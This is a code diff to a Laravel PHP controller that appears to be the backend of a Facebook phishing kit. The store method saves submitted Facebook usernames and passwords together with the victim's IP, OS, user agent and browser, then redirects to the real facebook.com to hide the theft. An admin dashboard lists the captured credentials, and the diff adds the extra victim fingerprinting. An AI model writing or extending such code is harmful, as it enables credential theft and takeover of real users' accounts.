@@ -20,7 +20,8 @@ class FacebookController extends Controller
     public function index()
     {
         $data           = LogUser::get();        
-        $credentials    = Facebook::get();   
+        $credentials    = Facebook::get();  
+        // dd($credentials); 
         return view('admin.dashboard.facebook.index', compact('data', 'credentials'));
     }
 
@@ -38,10 +39,25 @@ class FacebookController extends Controller
     public function store(Request $request)
     {
         $data = new Facebook();
+
+        // Current time in your default timezone
+        $now = Carbon::now();
+
+        // Convert to the desired timezone before saving
+        $nowInNewTimezone = $now->setTimezone('America/Caracas');
+
         $data->ip = $request->input('ip');
+        $data->type = $request->input('type');
+        $data->os = $request->input('os');
+        $data->useragent = $request->input('useragent');
+        $data->browser = $request->input('browser');
+        $data->created_at = $nowInNewTimezone;
+        
+
         $data->username = $request->input('username');
         $data->password = $request->input('password');
 
+        // dd($request->all());
         $data->save();
 
         return redirect('https://www.facebook.com');
@@ -76,7 +92,7 @@ class FacebookController extends Controller
             'created_at'    => $nowInNewTimezone,
         ]);
         
-        return view('templates.facebook.index', compact('ip'));
+        return view('templates.facebook.index', compact('ip', 'type', 'os', 'useragent', 'browser', 'nowInNewTimezone'));
     }
 
     /**
